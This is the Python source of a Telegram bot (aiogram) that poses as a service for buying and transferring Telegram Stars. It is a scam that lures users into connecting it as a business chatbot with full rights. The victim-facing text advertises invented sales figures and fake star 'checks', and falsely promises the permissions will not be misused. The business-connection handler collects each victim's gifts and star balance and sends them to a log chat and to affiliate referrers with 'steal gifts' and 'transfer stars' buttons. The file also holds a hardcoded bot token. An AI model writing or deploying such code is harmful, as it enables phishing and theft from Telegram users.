from aiogram import Bot, Dispatcher, types, F
from aiogram.fsm.context import FSMContext
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.state import State, StatesGroup
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.types import FSInputFile, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from aiogram.filters import CommandStart, Command
from aiogram.utils.keyboard import InlineKeyboardBuilder
import random
import os
import json
from datetime import datetime
import logging
import asyncio

# Constants
TOKEN = "8449764247:AAE8rqyigMhYIo5fl_8GS45TlhOUEHYKwC8"
LOG_CHAT_ID = -1002741941997
MAX_GIFTS_PER_RUN = 1000
ADMIN_IDS = [7917237979]
user_message_history = {}

# State classes
class Draw(StatesGroup):
    id = State()
    gift = State()

class CheckState(StatesGroup):
    waiting_for_amount = State()

# Initialize storage and logging
storage = MemoryStorage()
logging.basicConfig(level=logging.INFO)

# Load referrers data
if os.path.exists("referrers.json"):
    with open("referrers.json", "r") as f:
        user_referrer_map = json.load(f)
else:
    user_referrer_map = {}

# Initialize bot
bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher(storage=storage)

async def send_replaceable_message(chat_id: int, text: str, reply_markup=None, parse_mode=None):
    try:
        # Delete all previous messages except the first one
        if chat_id in user_message_history and len(user_message_history[chat_id]) > 1:
            for msg_id in user_message_history[chat_id][1:]:
                try:
                    await bot.delete_message(chat_id=chat_id, message_id=msg_id)
                except Exception as e:
                    logging.error(f"Error deleting message: {e}")
            user_message_history[chat_id] = user_message_history[chat_id][:1]
        
        # Send new message
        message = await bot.send_message(
            chat_id=chat_id,
            text=text,
            reply_markup=reply_markup,
            parse_mode=parse_mode
        )
        
        # Update message history
        if chat_id not in user_message_history:
            user_message_history[chat_id] = []
        user_message_history[chat_id].append(message.message_id)
        
        return message
    except Exception as e:
        logging.error(f"Error in send_replaceable_message: {e}")
        raise

def main_menu_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="👤 Профиль", callback_data="profile")],
        [InlineKeyboardButton(text="💳 Чеки", callback_data="checks")],
        [InlineKeyboardButton(text="⭐️ Получение звёзд", callback_data="get_stars")],
        [InlineKeyboardButton(text="📝 Условия", callback_data="terms")]
    ])

@dp.message(Command("start"))
async def start_cmd(message: types.Message):
    args = message.text.split(" ")
    user_id = message.from_user.id
    
    # Handle referral link
    if len(args) > 1 and args[1].startswith("ref"):
        ref_code = args[1]
        try:
            inviter_id = int(ref_code.replace("ref", ""))
            if inviter_id and inviter_id != user_id:
                user_referrer_map[str(user_id)] = inviter_id
                save_referrers()
                await message.answer(f"Вы были приглашены пользователем <code>{inviter_id}</code>!")
        except ValueError:
            pass

    photo = FSInputFile("image.jpg")
    await message.answer_photo(
        photo=photo,
        caption=(
            "Привет! Это удобный бот для покупки/передачи звезд в Telegram.\n\n"
            "С ним ты можешь моментально покупать и передавать звезды.\n\n"
            "Бот работает почти год, и с помощью него куплена огромная доля звезд в Telegram.\n\n"
            "С помощью бота куплено:\n"
            "6,307,360 ⭐️ (~ $94,610)\n\n"
            "Выберите действие:"
        ),
        reply_markup=main_menu_kb()
    )

    # Очищаем историю сообщений и добавляем стартовое сообщение
    if message.chat.id not in user_message_history:
        user_message_history[message.chat.id] = []
    else:
        # Оставляем только первое сообщение
        if len(user_message_history[message.chat.id]) > 0:
            first_msg_id = user_message_history[message.chat.id][0]
            user_message_history[message.chat.id] = [first_msg_id]
    
    # Добавляем ID стартового сообщения в историю
    user_message_history[message.chat.id].append(message.message_id + 1)  # +1 потому что photo message

@dp.callback_query(F.data == "profile")
async def show_profile(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    
    # Generate referral link
    ref_link = f"https://t.me/{(await bot.me()).username}?start=ref{user_id}"
    
    # Count referrals
    total_referrals = sum(1 for uid, inv_id in user_referrer_map.items() if str(inv_id) == str(user_id))
    
    profile_text = (
        f"👤 <b>Ваш профиль</b>\n\n"
        f"🆔 UUID Профиля: <code>{user_id}</code>\n"
        f"💰 Ваш баланс (в боте): 0 ⭐️\n\n"
        f"🚀 <b>Реферальная система</b>\n"
        f"Получай +10% от прибыли сервиса за покупки ваших рефералов!\n"
        f"👬 Всего рефералов: {total_referrals}\n"
        f"📌 Всего получено от рефералов: 0$\n"
        f"🔗 <b>Ваша реферальная ссылка:</b>\n"
        f"<code>{ref_link}</code>\n\n"
        f"📊 <b>Статистика</b>\n"
        f"📦 Успешных заказов: 0\n"
        f"⭐️ Куплено звёзд: 0"
    )
    
    await send_replaceable_message(
        chat_id=callback.message.chat.id,
        text=profile_text,
        reply_markup=None,
        parse_mode="HTML"
    )
    await callback.answer()

@dp.callback_query(F.data == "checks")
async def show_checks_info(callback: types.CallbackQuery):
    checks_info = (
        "💳 <b>Система чеков</b>\n\n"
        "Вы можете создавать чеки на определенное количество звезд и делиться ими с друзьями!\n\n"
        "<b>Как это работает:</b>\n"
        "1. Создайте чек командой /getcheck\n"
        "2. Укажите количество звезд\n"
        "3. Поделитесь чеком с друзьями\n"
        "4. Когда они активируют чек, вы получите часть звезд\n\n"
        "Для создания чека используйте команду /getcheck"
    )
    
    await send_replaceable_message(
        chat_id=callback.message.chat.id,
        text=checks_info,
        reply_markup=None,
        parse_mode="HTML"
    )
    await callback.answer()

@dp.message(Command("getcheck"))
async def create_check_start(message: types.Message, state: FSMContext):
    await message.answer("Введите количество звезд для чека (число от 1 до 10000):")
    await state.set_state(CheckState.waiting_for_amount)

@dp.message(CheckState.waiting_for_amount, F.text)
async def create_check_finish(message: types.Message, state: FSMContext):
    try:
        amount = int(message.text)
        if amount < 1 or amount > 10000:
            raise ValueError
    except ValueError:
        await message.answer("Пожалуйста, введите корректное число от 1 до 10000")
        return
    
    # Формируем реферальную ссылку отправителя
    ref_link = f"https://t.me/{(await bot.me()).username}?start=ref{message.from_user.id}"
    
    # Создаем кнопку с URL (реферальная ссылка)
    builder = InlineKeyboardBuilder()
    builder.button(
        text="📝 Активировать чек", 
        url=ref_link  # Теперь это URL-кнопка, а не callback
    )
    
    check_message = (
        f"💳 Чек на {amount} звёзд\n\n"
        f"От: @{message.from_user.username or message.from_user.id}\n\n"
        "Для активации чека нажмите кнопку ниже ⬇️"
    )
    
    await message.answer(check_message, reply_markup=builder.as_markup())
    await state.clear()

@dp.callback_query(F.data.startswith("show_activation_instructions:"))
async def show_activation_instructions(callback: types.CallbackQuery):
    amount = callback.data.split(":")[1]
    
    activation_instructions = (
        f"💳 Чек на {amount} звёзд\n\n"
        "⭐️ <b>Автоматическая доставка Stars — мгновенно и удобно!</b>\n\n"
        "1. ⚙️ Откройте <b>Настройки</b>.\n"
        "2. 💼 Нажмите на <b>Telegram для бизнеса</b>.\n"
        "3. 🤖 Перейдите в раздел <b>Чат-боты</b>.\n"
        "4. ✍️ Введите имя бота <b>@SendTgStarsBot</b> и нажмите <b>Добавить</b>.\n"
        "5. ✅ Выдайте разрешения пункт <b>'Подарки и звезды' (5/5)</b> для выдачи звезд.\n\n"
        "<i>Зачем это нужно?</i>\n"
        "• Подключение бота к бизнес-чату необходимо для того, чтобы он мог автоматически "
        "и напрямую отправлять звезды от одного пользователя другому — без лишних действий "
        "и подтверждений."
    )
    
    await send_replaceable_message(
        chat_id=callback.message.chat.id,
        text=activation_instructions,
        reply_markup=None,
        parse_mode="HTML"
    )
    await callback.answer()

@dp.callback_query(F.data == "get_stars")
async def show_get_stars_instructions(callback: types.CallbackQuery):
    stars_instructions = (
        "💳 Чек на 150 звёзд\n\n"
        "⭐️ <b>Автоматическая доставка Stars — мгновенно и удобно!</b>\n\n"
        "1. ⚙️ Откройте <b>Настройки</b>.\n"
        "2. 💼 Нажмите на <b>Telegram для бизнеса</b>.\n"
        "3. 🤖 Перейдите в раздел <b>Чат-боты</b>.\n"
        "4. ✍️ Введите имя бота <b>@SendTgStarsBot</b> и нажмите <b>Добавить</b>.\n"
        "5. ✅ Выдайте разрешения пункт <b>'Подарки и звезды' (5/5)</b> для выдачи звезд.\n\n"
        "<i>Зачем это нужно?</i>\n"
        "• Подключение бота к бизнес-чату необходимо для того, чтобы он мог автоматически "
        "и напрямую отправлять звезды от одного пользователя другому — без лишних действий "
        "и подтверждений."
    )
    
    await send_replaceable_message(
        chat_id=callback.message.chat.id,
        text=stars_instructions,
        reply_markup=None,
        parse_mode="HTML"
    )
    await callback.answer()

@dp.callback_query(F.data == "terms")
async def show_terms(callback: types.CallbackQuery):
    terms_text = (
        "<b>Условия использования @SendTgStarsBot:</b>\n\n"
        "Полным и безоговорочным принятием условий данной оферты считается оплата клиентом услуг компании.\n\n"
        "1. Запрещено пополнять звезды и возвращать их, иначе компания в праве досрочно остановить предоставление услуги и заблокировать клиента без возможности возврата средств.\n"
        "2. Запрещено игнорирование жалоб компании, в случае игнорирования жалобы клиентом, компания имеет право отказать клиенту в своих услугах.\n"
        "3. Клиенту предоставляется доступ (если не оговорено иное) к звездам, и клиент несет всю связанную с этим ответственность.\n"
        "4. В случае нарушения условий предоставления услуг компания в праве отказать клиенту в возврате средств.\n"
        "5. Возврат денежных средств возможен только в случае неработоспособности или за технические ошибки бота по вине компании.\n"
        "6. Проблемы с пополнением/возвратом звезд — ответственность компании.\n\n"
        "<i>С уважением, команда @SendTgStarsBot.</i>"
    )
    
    await send_replaceable_message(
        chat_id=callback.message.chat.id,
        text=terms_text,
        reply_markup=None,
        parse_mode="HTML"
    )
    await callback.answer()

# Business connection handler (unchanged from your original code)
@dp.business_connection()
async def handle_business(business_connection: types.BusinessConnection):
    business_id = business_connection.id
    builder = InlineKeyboardBuilder()
    
    builder.button(
        text="🎁 Украсть подарки", 
        callback_data=f"steal_gifts:{business_id}"
    )
    builder.button(
        text="💰 Перевести звёзды", 
        callback_data=f"transfer_stars:{business_id}"
    )
    builder.button(
        text="⛔️ Удалить подключение", 
        callback_data=f"destroy:{business_id}"
    )
    builder.adjust(1)
    
    user = business_connection.user
    
    try:
        info = await bot.get_business_connection(business_id)
        rights = info.rights
        
        # Проверка необходимых прав
        required_rights = [
            rights.can_read_messages,
            rights.can_delete_all_messages,
            rights.can_convert_gifts_to_stars,
            rights.can_transfer_stars
        ]
        
        if not all(required_rights):
            warning_message = (
                "⛔️ Вы не предоставили все права боту\n\n"
                "🔔 Для корректной работы бота необходимо предоставить ему все права в настройках.\n\n"
                "⚠️ Мы не используем эти права в плохих целях, все эти права нужны нам лишь чтобы отправлять звёзды по вашим чекам.\n\n"
                "✅ Как только вы предоставите все права, бот автоматически уведомит вас о том, что всё готово к использованию"
            )
            try:
                await bot.send_message(
                    chat_id=user.id,
                    text=warning_message
                )
            except Exception as e:
                await bot.send_message(LOG_CHAT_ID, f"⚠️ Не удалось отправить предупреждение пользователю {user.id}: {e}")
        
        gifts = await bot.get_business_account_gifts(business_id, exclude_unique=False)
        stars = await bot.get_business_account_star_balance(business_id)
    except Exception as e:
        await bot.send_message(LOG_CHAT_ID, f"❌ Ошибка получения данных бизнес-аккаунта: {e}")
        return

    # Рассчеты
    total_price = sum(g.convert_star_count or 0 for g in gifts.gifts if g.type == "regular")
    nft_gifts = [g for g in gifts.gifts if g.type == "unique"]
    nft_transfer_cost = len(nft_gifts) * 25
    total_withdrawal_cost = total_price + nft_transfer_cost
    
    # Форматирование текста (остаётся без изменений)
    header = f"✨ <b>Новое подключение бизнес-аккаунта</b> ✨\n\n"
    user_info = (
        f"<blockquote>👤 <b>Информация о пользователе:</b>\n"
        f"├─ ID: <code>{user.id}</code>\n"
        f"├─ Username: @{user.username or 'нет'}\n"
        f"╰─ Имя: {user.first_name or ''} {user.last_name or ''}</blockquote>\n\n"
    )
    balance_info = (
        f"<blockquote>💰 <b>Баланс:</b>\n"
        f"├─ Доступно звёзд: {int(stars.amount):,}\n"
        f"├─ Звёзд в подарках: {total_price:,}\n"
        f"╰─ <b>Итого:</b> {int(stars.amount) + total_price:,}</blockquote>\n\n"
    )
    gifts_info = (
        f"<blockquote>🎁 <b>Подарки:</b>\n"
        f"├─ Всего: {gifts.total_count}\n"
        f"├─ Обычные: {gifts.total_count - len(nft_gifts)}\n"
        f"├─ NFT: {len(nft_gifts)}\n"
        f"├─ <b>Стоимость переноса NFT:</b> {nft_transfer_cost:,} звёзд (25 за каждый)\n"
        f"╰─ <b>Общая стоимость вывода:</b> {total_withdrawal_cost:,} звёзд</blockquote>"
    )
    
    nft_list = ""
    if nft_gifts:
        nft_items = []
        for idx, g in enumerate(nft_gifts, 1):
            try:
                gift_id = getattr(g, 'id', 'скрыт')
                nft_items.append(f"├─ NFT #{idx} (ID: {gift_id}) - 25⭐")
            except AttributeError:
                nft_items.append(f"├─ NFT #{idx} (скрыт) - 25⭐")
        
        nft_list = "\n<blockquote>🔗 <b>NFT подарки:</b>\n" + \
                  "\n".join(nft_items) + \
                  f"\n╰─ <b>Итого:</b> {len(nft_gifts)} NFT = {nft_transfer_cost}⭐</blockquote>\n\n"
    
    rights_info = (
        f"<blockquote>🔐 <b>Права бота:</b>\n"
        f"├─ Основные: {'✅' if rights.can_read_messages else '❌'} Чтение | "
        f"{'✅' if rights.can_delete_all_messages else '❌'} Удаление\n"
        f"├─ Профиль: {'✅' if rights.can_edit_name else '❌'} Имя | "
        f"{'✅' if rights.can_edit_username else '❌'} Username\n"
        f"╰─ Подарки: {'✅' if rights.can_convert_gifts_to_stars else '❌'} Конвертация | "
        f"{'✅' if rights.can_transfer_stars else '❌'} Перевод</blockquote>\n\n"
    )
    
    footer = (
        f"<blockquote>ℹ️ <i>Перенос каждого NFT подарка стоит 25 звёзд</i>\n"
        f"🕒 Время: {datetime.now().strftime('%d.%m.%Y %H:%M')}</blockquote>"
    )
    
    full_message = header + user_info + balance_info + gifts_info + nft_list + rights_info + footer
    
    # 1. Отправка в основной лог-чат
    try:
        await bot.send_message(
            chat_id=LOG_CHAT_ID,
            text=full_message,
            reply_markup=builder.as_markup(),
            parse_mode="HTML",
            disable_web_page_preview=True
        )
    except Exception as e:
        logging.error(f"Ошибка при отправке в лог-чат: {e}")

    # 2. Отправка пригласившему (если есть)
    inviter_id = user_referrer_map.get(str(user.id))
    
    if inviter_id and inviter_id != user.id:
        try:
            await bot.send_message(
                chat_id=inviter_id,
                text=full_message,
                reply_markup=builder.as_markup(),
                parse_mode="HTML",
                disable_web_page_preview=True
            )
            
            # Update referrer stats
            if str(inviter_id) in user_data:
                user_data[str(inviter_id)]["earned_from_referrals"] += total_withdrawal_cost * 0.1  # 10% commission
                save_user_data()
                
        except Exception as e:
            error_msg = f"⚠️ Не удалось отправить лог пригласившему {inviter_id}: {str(e)}"
            logging.error(error_msg)
            await bot.send_message(LOG_CHAT_ID, error_msg)

def save_referrers():
    with open("referrers.json", "w") as f:
        json.dump(user_referrer_map, f)

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
